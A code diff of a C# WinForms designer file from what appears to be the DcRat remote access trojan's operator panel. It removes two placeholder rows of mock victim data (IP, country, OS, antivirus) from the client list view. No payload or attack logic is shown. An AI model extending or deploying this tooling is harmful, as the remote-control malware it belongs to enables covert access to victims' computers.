@@ -30,28 +30,6 @@ namespace DcRat.ChildForms
         private void InitializeComponent()
         {
             this.components = new System.ComponentModel.Container();
-            System.Windows.Forms.ListViewItem listViewItem1 = new System.Windows.Forms.ListViewItem(new string[] {
-            "127.0.0.1",
-            "China",
-            "test",
-            "1234567890",
-            "qwqdanchun/Admin",
-            "Windows 10 Pro",
-            "True",
-            "Type1 installer at 2021/12/29/12:44",
-            "Windows Defender",
-            "0ms",
-            "Program"}, -1);
-            System.Windows.Forms.ListViewItem listViewItem2 = new System.Windows.Forms.ListViewItem(new string[] {
-            "123",
-            "American",
-            "Default",
-            "asdfghjkl",
-            "28718/User",
-            "Windows 7",
-            "False",
-            "",
-            ""}, -1);
             System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(childFormHome));
             this.toolStripMain = new System.Windows.Forms.ToolStrip();
             this.toolStripButtoncmd = new System.Windows.Forms.ToolStripButton();
@@ -295,10 +273,6 @@ namespace DcRat.ChildForms
             this.listViewHome.ForeColor = System.Drawing.SystemColors.WindowText;
             this.listViewHome.FullRowSelect = true;
             this.listViewHome.HideSelection = false;
-            listViewItem1.StateImageIndex = 0;
-            this.listViewHome.Items.AddRange(new System.Windows.Forms.ListViewItem[] {
-            listViewItem1,
-            listViewItem2});
             this.listViewHome.LargeImageList = this.imageListicon;
             this.listViewHome.Location = new System.Drawing.Point(0, 0);
             this.listViewHome.MultiSelect = false;
